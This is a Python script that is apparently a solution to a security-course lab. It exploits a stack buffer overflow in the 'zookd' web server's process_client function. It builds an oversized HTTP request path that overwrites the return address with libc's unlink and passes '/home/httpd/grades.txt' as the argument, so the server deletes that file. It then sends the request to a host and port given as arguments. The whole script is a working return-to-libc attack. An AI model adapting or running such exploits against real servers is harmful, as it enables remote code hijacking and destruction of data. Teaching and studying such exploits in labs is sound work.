#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

def build_exploit():
    ## zookd.c: process_client.
    ##  C:
    ##   static void process_client(int fd)
    ##   {
    ##     static char env[8192];  /* static variables are not on the stack */
    ##     static size_t env_len;
    ##     char reqpath[2048];
    ##     const char *errmsg;
    ##     int i;
    ##
    ##     /* get the request line */
    ##     if ((errmsg = http_request_line(fd, reqpath, env, &env_len)))
    ##       return http_err(fd, 500, "http_request_line: %s", errmsg);
    ##
    ## unlink = 0x40102450
    ## &reqpath = 0xbfffee08
    ## ebp = 0xbffff618

    unlink_addr = 0x40102450
    reqpath_addr = 0xbfffee08 
    ebp_addr = 0xbffff618

    bad_url = '/' + ('a' * (ebp_addr - reqpath_addr - 1)) # fill up till ebp
    bad_url += struct.pack("<I", 0x12345678)    # saved_ebp
    bad_url += struct.pack("<I", unlink_addr)   # hijack to unlink
    bad_url += struct.pack("<I", 0x12345678)    # unlink ret address
    bad_url += struct.pack("<I", ebp_addr + 16) # address of "/home/httpd/grades.txt"
    bad_url += "/home/httpd/grades.txt"

    req =   "GET " + urllib.quote(bad_url) + " HTTP/1.0\r\n" + \
            "\r\n"
    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    req = build_exploit()
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

